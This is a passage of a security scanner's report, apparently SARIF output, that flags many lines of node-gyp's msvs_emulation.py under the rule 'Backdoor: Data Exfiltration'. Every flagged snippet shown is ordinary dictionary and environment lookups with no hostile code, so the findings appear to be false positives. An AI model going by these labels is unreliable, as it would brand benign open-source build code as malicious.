                  "endLine": 6,
                  "endColumn": 61,
                  "snippet": {
                    "text": "# found in the LICENSE file.\n\n\"\"\"\nThis module helps emulate Visual Studio 2008 behavior on top of other\nbuild systems, primarily ninja.\n\"\"\"\n\n",
                    "rendered": {
                      "text": "# found in the LICENSE file.\n\n\"\"\"\nThis module helps emulate Visual Studio 2008 behavior on top of other\nbuild systems, primarily ninja.\n\"\"\"\n\n",
                      "markdown": "`# found in the LICENSE file.\n\n\"\"\"\nThis module helps emulate Visual Studio 2008 behavior on top of other\nbuild systems, primarily ninja.\n\"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 1255,
                  "startColumn": 81,
                  "endLine": 1255,
                  "endColumn": 86,
                  "snippet": {
                    "text": "    # PROCESSOR_ARCHITECTURE (which reflects the word size of the current\n    # process), it is also necessary to check PROCESSOR_ARCHITEW6432 (which\n    # contains the actual word size of the system when running thru WOW64).\n    if \"64\" in os.environ.get(\"PROCESSOR_ARCHITECTURE\", \"\") or \"64\" in os.environ.get(\n        \"PROCESSOR_ARCHITEW6432\", \"\"\n    ):\n        default_variables[\"MSVS_OS_BITS\"] = 64\n",
                    "rendered": {
                      "text": "    # PROCESSOR_ARCHITECTURE (which reflects the word size of the current\n    # process), it is also necessary to check PROCESSOR_ARCHITEW6432 (which\n    # contains the actual word size of the system when running thru WOW64).\n    if \"64\" in os.environ.get(\"PROCESSOR_ARCHITECTURE\", \"\") or \"64\" in os.environ.get(\n        \"PROCESSOR_ARCHITEW6432\", \"\"\n    ):\n        default_variables[\"MSVS_OS_BITS\"] = 64\n",
                      "markdown": "`    # PROCESSOR_ARCHITECTURE (which reflects the word size of the current\n    # process), it is also necessary to check PROCESSOR_ARCHITEW6432 (which\n    # contains the actual word size of the system when running thru WOW64).\n    if \"64\" in os.environ.get(\"PROCESSOR_ARCHITECTURE\", \"\") or \"64\" in os.environ.get(\n        \"PROCESSOR_ARCHITEW6432\", \"\"\n    ):\n        default_variables[\"MSVS_OS_BITS\"] = 64\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 1255,
                  "startColumn": 25,
                  "endLine": 1255,
                  "endColumn": 30,
                  "snippet": {
                    "text": "    # PROCESSOR_ARCHITECTURE (which reflects the word size of the current\n    # process), it is also necessary to check PROCESSOR_ARCHITEW6432 (which\n    # contains the actual word size of the system when running thru WOW64).\n    if \"64\" in os.environ.get(\"PROCESSOR_ARCHITECTURE\", \"\") or \"64\" in os.environ.get(\n        \"PROCESSOR_ARCHITEW6432\", \"\"\n    ):\n        default_variables[\"MSVS_OS_BITS\"] = 64\n",
                    "rendered": {
                      "text": "    # PROCESSOR_ARCHITECTURE (which reflects the word size of the current\n    # process), it is also necessary to check PROCESSOR_ARCHITEW6432 (which\n    # contains the actual word size of the system when running thru WOW64).\n    if \"64\" in os.environ.get(\"PROCESSOR_ARCHITECTURE\", \"\") or \"64\" in os.environ.get(\n        \"PROCESSOR_ARCHITEW6432\", \"\"\n    ):\n        default_variables[\"MSVS_OS_BITS\"] = 64\n",
                      "markdown": "`    # PROCESSOR_ARCHITECTURE (which reflects the word size of the current\n    # process), it is also necessary to check PROCESSOR_ARCHITEW6432 (which\n    # contains the actual word size of the system when running thru WOW64).\n    if \"64\" in os.environ.get(\"PROCESSOR_ARCHITECTURE\", \"\") or \"64\" in os.environ.get(\n        \"PROCESSOR_ARCHITEW6432\", \"\"\n    ):\n        default_variables[\"MSVS_OS_BITS\"] = 64\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 1245,
                  "startColumn": 28,
                  "endLine": 1245,
                  "endColumn": 33,
                  "snippet": {
                    "text": "# Sets some values in default_variables, which are required for many\n# generators, run on Windows.\ndef CalculateCommonVariables(default_variables, params):\n    generator_flags = params.get(\"generator_flags\", {})\n\n    # Set a variable so conditions can be based on msvs_version.\n    msvs_version = gyp.msvs_emulation.GetVSVersion(generator_flags)\n",
                    "rendered": {
                      "text": "# Sets some values in default_variables, which are required for many\n# generators, run on Windows.\ndef CalculateCommonVariables(default_variables, params):\n    generator_flags = params.get(\"generator_flags\", {})\n\n    # Set a variable so conditions can be based on msvs_version.\n    msvs_version = gyp.msvs_emulation.GetVSVersion(generator_flags)\n",
                      "markdown": "`# Sets some values in default_variables, which are required for many\n# generators, run on Windows.\ndef CalculateCommonVariables(default_variables, params):\n    generator_flags = params.get(\"generator_flags\", {})\n\n    # Set a variable so conditions can be based on msvs_version.\n    msvs_version = gyp.msvs_emulation.GetVSVersion(generator_flags)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 1231,
                  "startColumn": 26,
                  "endLine": 1231,
                  "endColumn": 31,
                  "snippet": {
                    "text": "    exist on disk. Missing files cause needless recompilation when building via\n    VS, and we want this check to match for people/bots that build using ninja,\n    so they're not surprised when the VS build fails.\"\"\"\n    if int(generator_flags.get(\"msvs_error_on_missing_sources\", 0)):\n        no_specials = filter(lambda x: \"$\" not in x, sources)\n        relative = [os.path.join(build_dir, gyp_to_ninja(s)) for s in no_specials]\n        missing = [x for x in relative if not os.path.exists(x)]\n",
                    "rendered": {
                      "text": "    exist on disk. Missing files cause needless recompilation when building via\n    VS, and we want this check to match for people/bots that build using ninja,\n    so they're not surprised when the VS build fails.\"\"\"\n    if int(generator_flags.get(\"msvs_error_on_missing_sources\", 0)):\n        no_specials = filter(lambda x: \"$\" not in x, sources)\n        relative = [os.path.join(build_dir, gyp_to_ninja(s)) for s in no_specials]\n        missing = [x for x in relative if not os.path.exists(x)]\n",
                      "markdown": "`    exist on disk. Missing files cause needless recompilation when building via\n    VS, and we want this check to match for people/bots that build using ninja,\n    so they're not surprised when the VS build fails.\"\"\"\n    if int(generator_flags.get(\"msvs_error_on_missing_sources\", 0)):\n        no_specials = filter(lambda x: \"$\" not in x, sources)\n        relative = [os.path.join(build_dir, gyp_to_ninja(s)) for s in no_specials]\n        missing = [x for x in relative if not os.path.exists(x)]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 1205,
                  "startColumn": 19,
                  "endLine": 1205,
                  "endColumn": 24,
                  "snippet": {
                    "text": "        # Inject system includes from gyp files into INCLUDE.\n        if system_includes:\n            system_includes = system_includes | OrderedSet(\n                env.get(\"INCLUDE\", \"\").split(\";\")\n            )\n            env[\"INCLUDE\"] = \";\".join(system_includes)\n\n",
                    "rendered": {
                      "text": "        # Inject system includes from gyp files into INCLUDE.\n        if system_includes:\n            system_includes = system_includes | OrderedSet(\n                env.get(\"INCLUDE\", \"\").split(\";\")\n            )\n            env[\"INCLUDE\"] = \";\".join(system_includes)\n\n",
                      "markdown": "`        # Inject system includes from gyp files into INCLUDE.\n        if system_includes:\n            system_includes = system_includes | OrderedSet(\n                env.get(\"INCLUDE\", \"\").split(\";\")\n            )\n            env[\"INCLUDE\"] = \";\".join(system_includes)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 1183,
                  "startColumn": 22,
                  "endLine": 1183,
                  "endColumn": 27,
                  "snippet": {
                    "text": "    \"-G ninja_use_custom_environment_files\" to the gyp to suppress file\n    generation and use custom environment files prepared by yourself.\"\"\"\n    archs = (\"x86\", \"x64\")\n    if generator_flags.get(\"ninja_use_custom_environment_files\", 0):\n        cl_paths = {}\n        for arch in archs:\n            cl_paths[arch] = \"cl.exe\"\n",
                    "rendered": {
                      "text": "    \"-G ninja_use_custom_environment_files\" to the gyp to suppress file\n    generation and use custom environment files prepared by yourself.\"\"\"\n    archs = (\"x86\", \"x64\")\n    if generator_flags.get(\"ninja_use_custom_environment_files\", 0):\n        cl_paths = {}\n        for arch in archs:\n            cl_paths[arch] = \"cl.exe\"\n",
                      "markdown": "`    \"-G ninja_use_custom_environment_files\" to the gyp to suppress file\n    generation and use custom environment files prepared by yourself.\"\"\"\n    archs = (\"x86\", \"x64\")\n    if generator_flags.get(\"ninja_use_custom_environment_files\", 0):\n        cl_paths = {}\n        for arch in archs:\n            cl_paths[arch] = \"cl.exe\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 1084,
                  "startColumn": 27,
                  "endLine": 1084,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    global vs_version\n    if not vs_version:\n        vs_version = gyp.MSVSVersion.SelectVisualStudioVersion(\n            generator_flags.get(\"msvs_version\", \"auto\"), allow_fallback=False\n        )\n    return vs_version\n\n",
                    "rendered": {
                      "text": "    global vs_version\n    if not vs_version:\n        vs_version = gyp.MSVSVersion.SelectVisualStudioVersion(\n            generator_flags.get(\"msvs_version\", \"auto\"), allow_fallback=False\n        )\n    return vs_version\n\n",
                      "markdown": "`    global vs_version\n    if not vs_version:\n        vs_version = gyp.MSVSVersion.SelectVisualStudioVersion(\n            generator_flags.get(\"msvs_version\", \"auto\"), allow_fallback=False\n        )\n    return vs_version\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 960,
                  "startColumn": 67,
                  "endLine": 960,
                  "endColumn": 72,
                  "snippet": {
                    "text": "    def _HasExplicitIdlActions(self, spec):\n        \"\"\"Determine if an action should not run midl for .idl files.\"\"\"\n        return any(\n            action.get(\"explicit_idl_action\", 0) for action in spec.get(\"actions\", [])\n        )\n\n    def HasExplicitIdlRulesOrActions(self, spec):\n",
                    "rendered": {
                      "text": "    def _HasExplicitIdlActions(self, spec):\n        \"\"\"Determine if an action should not run midl for .idl files.\"\"\"\n        return any(\n            action.get(\"explicit_idl_action\", 0) for action in spec.get(\"actions\", [])\n        )\n\n    def HasExplicitIdlRulesOrActions(self, spec):\n",
                      "markdown": "`    def _HasExplicitIdlActions(self, spec):\n        \"\"\"Determine if an action should not run midl for .idl files.\"\"\"\n        return any(\n            action.get(\"explicit_idl_action\", 0) for action in spec.get(\"actions\", [])\n        )\n\n    def HasExplicitIdlRulesOrActions(self, spec):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 960,
                  "startColumn": 18,
                  "endLine": 960,
                  "endColumn": 23,
                  "snippet": {
                    "text": "    def _HasExplicitIdlActions(self, spec):\n        \"\"\"Determine if an action should not run midl for .idl files.\"\"\"\n        return any(\n            action.get(\"explicit_idl_action\", 0) for action in spec.get(\"actions\", [])\n        )\n\n    def HasExplicitIdlRulesOrActions(self, spec):\n",
                    "rendered": {
                      "text": "    def _HasExplicitIdlActions(self, spec):\n        \"\"\"Determine if an action should not run midl for .idl files.\"\"\"\n        return any(\n            action.get(\"explicit_idl_action\", 0) for action in spec.get(\"actions\", [])\n        )\n\n    def HasExplicitIdlRulesOrActions(self, spec):\n",
                      "markdown": "`    def _HasExplicitIdlActions(self, spec):\n        \"\"\"Determine if an action should not run midl for .idl files.\"\"\"\n        return any(\n            action.get(\"explicit_idl_action\", 0) for action in spec.get(\"actions\", [])\n        )\n\n    def HasExplicitIdlRulesOrActions(self, spec):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 955,
                  "startColumn": 66,
                  "endLine": 955,
                  "endColumn": 71,
                  "snippet": {
                    "text": "\n    def _HasExplicitRuleForExtension(self, spec, extension):\n        \"\"\"Determine if there's an explicit rule for a particular extension.\"\"\"\n        return any(rule[\"extension\"] == extension for rule in spec.get(\"rules\", []))\n\n    def _HasExplicitIdlActions(self, spec):\n        \"\"\"Determine if an action should not run midl for .idl files.\"\"\"\n",
                    "rendered": {
                      "text": "\n    def _HasExplicitRuleForExtension(self, spec, extension):\n        \"\"\"Determine if there's an explicit rule for a particular extension.\"\"\"\n        return any(rule[\"extension\"] == extension for rule in spec.get(\"rules\", []))\n\n    def _HasExplicitIdlActions(self, spec):\n        \"\"\"Determine if an action should not run midl for .idl files.\"\"\"\n",
                      "markdown": "`\n    def _HasExplicitRuleForExtension(self, spec, extension):\n        \"\"\"Determine if there's an explicit rule for a particular extension.\"\"\"\n        return any(rule[\"extension\"] == extension for rule in spec.get(\"rules\", []))\n\n    def _HasExplicitIdlActions(self, spec):\n        \"\"\"Determine if an action should not run midl for .idl files.\"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 948,
                  "startColumn": 28,
                  "endLine": 948,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        # Default to quoting. There's only a few special instances where the\n        # target command uses non-standard command line parsing and handle quotes\n        # and quote escaping differently.\n        quote_cmd = int(rule.get(\"msvs_quote_cmd\", 1))\n        assert quote_cmd != 0 or cygwin != 1, \\\n               \"msvs_quote_cmd=0 only applicable for msvs_cygwin_shell=0\"\n        return MsvsSettings.RuleShellFlags(cygwin, quote_cmd)\n",
                    "rendered": {
                      "text": "        # Default to quoting. There's only a few special instances where the\n        # target command uses non-standard command line parsing and handle quotes\n        # and quote escaping differently.\n        quote_cmd = int(rule.get(\"msvs_quote_cmd\", 1))\n        assert quote_cmd != 0 or cygwin != 1, \\\n               \"msvs_quote_cmd=0 only applicable for msvs_cygwin_shell=0\"\n        return MsvsSettings.RuleShellFlags(cygwin, quote_cmd)\n",
                      "markdown": "`        # Default to quoting. There's only a few special instances where the\n        # target command uses non-standard command line parsing and handle quotes\n        # and quote escaping differently.\n        quote_cmd = int(rule.get(\"msvs_quote_cmd\", 1))\n        assert quote_cmd != 0 or cygwin != 1, \\\n               \"msvs_quote_cmd=0 only applicable for msvs_cygwin_shell=0\"\n        return MsvsSettings.RuleShellFlags(cygwin, quote_cmd)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 944,
                  "startColumn": 39,
                  "endLine": 944,
                  "endColumn": 44,
                  "snippet": {
                    "text": "        whether the commands should be quoted (msvs_quote_cmd).\"\"\"\n        # If the variable is unset, or set to 1 we use cygwin\n        cygwin = int(rule.get(\"msvs_cygwin_shell\",\n                              self.spec.get(\"msvs_cygwin_shell\", 1))) != 0\n        # Default to quoting. There's only a few special instances where the\n        # target command uses non-standard command line parsing and handle quotes\n        # and quote escaping differently.\n",
                    "rendered": {
                      "text": "        whether the commands should be quoted (msvs_quote_cmd).\"\"\"\n        # If the variable is unset, or set to 1 we use cygwin\n        cygwin = int(rule.get(\"msvs_cygwin_shell\",\n                              self.spec.get(\"msvs_cygwin_shell\", 1))) != 0\n        # Default to quoting. There's only a few special instances where the\n        # target command uses non-standard command line parsing and handle quotes\n        # and quote escaping differently.\n",
                      "markdown": "`        whether the commands should be quoted (msvs_quote_cmd).\"\"\"\n        # If the variable is unset, or set to 1 we use cygwin\n        cygwin = int(rule.get(\"msvs_cygwin_shell\",\n                              self.spec.get(\"msvs_cygwin_shell\", 1))) != 0\n        # Default to quoting. There's only a few special instances where the\n        # target command uses non-standard command line parsing and handle quotes\n        # and quote escaping differently.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 943,
                  "startColumn": 25,
                  "endLine": 943,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        includes whether it should run under cygwin (msvs_cygwin_shell), and\n        whether the commands should be quoted (msvs_quote_cmd).\"\"\"\n        # If the variable is unset, or set to 1 we use cygwin\n        cygwin = int(rule.get(\"msvs_cygwin_shell\",\n                              self.spec.get(\"msvs_cygwin_shell\", 1))) != 0\n        # Default to quoting. There's only a few special instances where the\n        # target command uses non-standard command line parsing and handle quotes\n",
                    "rendered": {
                      "text": "        includes whether it should run under cygwin (msvs_cygwin_shell), and\n        whether the commands should be quoted (msvs_quote_cmd).\"\"\"\n        # If the variable is unset, or set to 1 we use cygwin\n        cygwin = int(rule.get(\"msvs_cygwin_shell\",\n                              self.spec.get(\"msvs_cygwin_shell\", 1))) != 0\n        # Default to quoting. There's only a few special instances where the\n        # target command uses non-standard command line parsing and handle quotes\n",
                      "markdown": "`        includes whether it should run under cygwin (msvs_cygwin_shell), and\n        whether the commands should be quoted (msvs_quote_cmd).\"\"\"\n        # If the variable is unset, or set to 1 we use cygwin\n        cygwin = int(rule.get(\"msvs_cygwin_shell\",\n                              self.spec.get(\"msvs_cygwin_shell\", 1))) != 0\n        # Default to quoting. There's only a few special instances where the\n        # target command uses non-standard command line parsing and handle quotes\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 617,
                  "startColumn": 31,
                  "endLine": 617,
                  "endColumn": 36,
                  "snippet": {
                    "text": "        spec = self.spec\n        if spec[\"type\"] in (\"shared_library\", \"loadable_module\", \"executable\"):\n            def_files = [\n                s for s in spec.get(\"sources\", []) if s.lower().endswith(\".def\")\n            ]\n            if len(def_files) == 1:\n                return gyp_to_build_path(def_files[0])\n",
                    "rendered": {
                      "text": "        spec = self.spec\n        if spec[\"type\"] in (\"shared_library\", \"loadable_module\", \"executable\"):\n            def_files = [\n                s for s in spec.get(\"sources\", []) if s.lower().endswith(\".def\")\n            ]\n            if len(def_files) == 1:\n                return gyp_to_build_path(def_files[0])\n",
                      "markdown": "`        spec = self.spec\n        if spec[\"type\"] in (\"shared_library\", \"loadable_module\", \"executable\"):\n            def_files = [\n                s for s in spec.get(\"sources\", []) if s.lower().endswith(\".def\")\n            ]\n            if len(def_files) == 1:\n                return gyp_to_build_path(def_files[0])\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 333,
                  "startColumn": 63,
                  "endLine": 333,
                  "endColumn": 68,
                  "snippet": {
                    "text": "        if not platform:  # If no specific override, use the configuration's.\n            platform = configuration_platform\n        # Map from platform to architecture.\n        return {\"Win32\": \"x86\", \"x64\": \"x64\", \"ARM64\": \"arm64\"}.get(platform, \"x86\")\n\n    def _TargetConfig(self, config):\n        \"\"\"Returns the target-specific configuration.\"\"\"\n",
                    "rendered": {
                      "text": "        if not platform:  # If no specific override, use the configuration's.\n            platform = configuration_platform\n        # Map from platform to architecture.\n        return {\"Win32\": \"x86\", \"x64\": \"x64\", \"ARM64\": \"arm64\"}.get(platform, \"x86\")\n\n    def _TargetConfig(self, config):\n        \"\"\"Returns the target-specific configuration.\"\"\"\n",
                      "markdown": "`        if not platform:  # If no specific override, use the configuration's.\n            platform = configuration_platform\n        # Map from platform to architecture.\n        return {\"Win32\": \"x86\", \"x64\": \"x64\", \"ARM64\": \"arm64\"}.get(platform, \"x86\")\n\n    def _TargetConfig(self, config):\n        \"\"\"Returns the target-specific configuration.\"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 329,
                  "startColumn": 44,
                  "endLine": 329,
                  "endColumn": 49,
                  "snippet": {
                    "text": "        \"\"\"Get architecture based on msvs_configuration_platform and\n        msvs_target_platform. Returns either 'x86' or 'x64'.\"\"\"\n        configuration_platform = self.msvs_configuration_platform.get(config, \"\")\n        platform = self.msvs_target_platform.get(config, \"\")\n        if not platform:  # If no specific override, use the configuration's.\n            platform = configuration_platform\n        # Map from platform to architecture.\n",
                    "rendered": {
                      "text": "        \"\"\"Get architecture based on msvs_configuration_platform and\n        msvs_target_platform. Returns either 'x86' or 'x64'.\"\"\"\n        configuration_platform = self.msvs_configuration_platform.get(config, \"\")\n        platform = self.msvs_target_platform.get(config, \"\")\n        if not platform:  # If no specific override, use the configuration's.\n            platform = configuration_platform\n        # Map from platform to architecture.\n",
                      "markdown": "`        \"\"\"Get architecture based on msvs_configuration_platform and\n        msvs_target_platform. Returns either 'x86' or 'x64'.\"\"\"\n        configuration_platform = self.msvs_configuration_platform.get(config, \"\")\n        platform = self.msvs_target_platform.get(config, \"\")\n        if not platform:  # If no specific override, use the configuration's.\n            platform = configuration_platform\n        # Map from platform to architecture.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 328,
                  "startColumn": 65,
                  "endLine": 328,
                  "endColumn": 70,
                  "snippet": {
                    "text": "    def GetArch(self, config):\n        \"\"\"Get architecture based on msvs_configuration_platform and\n        msvs_target_platform. Returns either 'x86' or 'x64'.\"\"\"\n        configuration_platform = self.msvs_configuration_platform.get(config, \"\")\n        platform = self.msvs_target_platform.get(config, \"\")\n        if not platform:  # If no specific override, use the configuration's.\n            platform = configuration_platform\n",
                    "rendered": {
                      "text": "    def GetArch(self, config):\n        \"\"\"Get architecture based on msvs_configuration_platform and\n        msvs_target_platform. Returns either 'x86' or 'x64'.\"\"\"\n        configuration_platform = self.msvs_configuration_platform.get(config, \"\")\n        platform = self.msvs_target_platform.get(config, \"\")\n        if not platform:  # If no specific override, use the configuration's.\n            platform = configuration_platform\n",
                      "markdown": "`    def GetArch(self, config):\n        \"\"\"Get architecture based on msvs_configuration_platform and\n        msvs_target_platform. Returns either 'x86' or 'x64'.\"\"\"\n        configuration_platform = self.msvs_configuration_platform.get(config, \"\")\n        platform = self.msvs_target_platform.get(config, \"\")\n        if not platform:  # If no specific override, use the configuration's.\n            platform = configuration_platform\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 259,
                  "startColumn": 69,
                  "endLine": 259,
                  "endColumn": 74,
                  "snippet": {
                    "text": "        equivalents.\"\"\"\n        target_arch = self.GetArch(config)\n        target_platform = \"Win32\" if target_arch == \"x86\" else target_arch\n        target_name = self.spec.get(\"product_prefix\", \"\") + self.spec.get(\n            \"product_name\", self.spec[\"target_name\"]\n        )\n        target_dir = base_to_build + \"\\\\\" if base_to_build else \"\"\n",
                    "rendered": {
                      "text": "        equivalents.\"\"\"\n        target_arch = self.GetArch(config)\n        target_platform = \"Win32\" if target_arch == \"x86\" else target_arch\n        target_name = self.spec.get(\"product_prefix\", \"\") + self.spec.get(\n            \"product_name\", self.spec[\"target_name\"]\n        )\n        target_dir = base_to_build + \"\\\\\" if base_to_build else \"\"\n",
                      "markdown": "`        equivalents.\"\"\"\n        target_arch = self.GetArch(config)\n        target_platform = \"Win32\" if target_arch == \"x86\" else target_arch\n        target_name = self.spec.get(\"product_prefix\", \"\") + self.spec.get(\n            \"product_name\", self.spec[\"target_name\"]\n        )\n        target_dir = base_to_build + \"\\\\\" if base_to_build else \"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
